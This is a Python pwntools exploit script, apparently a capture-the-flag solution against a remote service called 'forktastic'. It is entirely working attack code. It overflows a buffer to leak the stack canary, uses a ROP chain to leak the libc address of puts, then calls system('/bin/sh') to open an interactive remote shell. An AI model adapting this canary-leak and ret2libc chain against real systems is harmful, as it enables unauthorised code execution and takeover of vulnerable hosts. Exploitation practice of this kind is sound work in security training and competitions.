
from pwn import *
elf = ELF("./forktastic")

def run():
    return remote("forktastic.heltsikker.no", 9005)

rop = ROP(elf)
pop_rdi = p64(rop.rdi.address)
puts_got = p64(elf.got.puts)
puts_plt = p64(elf.plt.puts)
main_plt = p64(elf.symbols.do_stuff)

p = run()
p.sendlineafter(": ", "A"*8*9)
p.recvline()
canary = u64(b'\x00' + p.recvline()[:7]) 
p.close()

p = run()
p.sendlineafter(": ", b"A"*8*9 + p64(canary) + b"A"*8 + pop_rdi + puts_got +
        puts_plt + main_plt)
p.recvline()
leaked_puts = u64(p.recvline()[:8].strip().ljust(8,b"\x00"))
p.close()

libc = ELF("./libc.so")

libc.address = leaked_puts - libc.sym.puts

binsh = p64(next(libc.search(b"/bin/sh")))
system = p64(libc.sym.system)
exitt = p64(libc.sym["exit"])
ret = p64(rop.ret.address)

p = run()
p.sendlineafter(": ", b"A"*8*9 + p64(canary) + b"A"*8 + ret + pop_rdi + binsh +
        system + exitt)

p.interactive()
